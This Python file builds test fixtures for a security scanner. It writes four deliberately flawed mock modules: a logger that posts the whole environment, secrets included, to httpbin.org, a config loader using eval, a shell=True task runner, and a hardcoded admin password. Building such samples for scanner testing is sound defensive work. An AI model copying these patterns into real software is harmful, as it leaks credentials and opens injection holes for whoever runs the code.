"""
Mock packages containing subtle security flaws.

These samples were designed in the spirit of the mandatory "GitHub Copilot
Acceleration" track: natural-language prompts were used to generate code that
looks almost legitimate but hides common supply-chain / injection / secret
problems. The scanner + Gemma are then tested against them.
"""

from __future__ import annotations

from pathlib import Path

MOCK_DIR = Path("mock_packages")


VULNERABLE_SAMPLES = {
    "innocent_logger.py": '''\
"""
Simple logging utility – looks harmless at first glance.
(Generated style: "write a small logger that also records the environment for debugging")
"""
import os
import json
import urllib.request

def log_event(msg: str, extra: dict | None = None):
    payload = {
        "message": msg,
        "env": dict(os.environ),          # <-- subtle: ships all secrets
        "extra": extra or {},
    }
    # "debug endpoint" – classic exfil pattern
    try:
        req = urllib.request.Request(
            "https://httpbin.org/post",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass
    print(msg)
''',

    "config_loader.py": '''\
"""
Config loader that supports "advanced" expressions.
(Prompt style: "make a config loader that can evaluate simple expressions")
"""
import ast

def load_config(raw: str) -> dict:
    # Intentionally dangerous – junior devs sometimes reach for eval
    data = eval(raw)          # CRITICAL
    if not isinstance(data, dict):
        raise ValueError("config must be a dict")
    return data

def load_config_safer(raw: str) -> dict:
    # Better, but still not perfect for untrusted input
    return ast.literal_eval(raw)
''',

    "task_runner.py": '''\
"""
Tiny task runner.
(Prompt style: "write a helper that runs shell commands from a list of tasks")
"""
import subprocess

def run_tasks(tasks: list[str]):
    for cmd in tasks:
        # shell=True + unsanitized input = classic injection
        subprocess.run(cmd, shell=True, check=False)
''',

    "auth_helper.py": '''\
"""
Quick auth helper for internal tools.
"""
# Hardcoded fallback – never do this
DEFAULT_ADMIN_PASSWORD = "admin123"   # HIGH

def authenticate(user: str, password: str) -> bool:
    if user == "admin" and password == DEFAULT_ADMIN_PASSWORD:
        return True
    return False
''',
}


def ensure_mock_packages() -> Path:
    """Write the mock vulnerable samples to disk and return the directory."""
    MOCK_DIR.mkdir(exist_ok=True)
    for name, content in VULNERABLE_SAMPLES.items():
        (MOCK_DIR / name).write_text(content)
    return MOCK_DIR
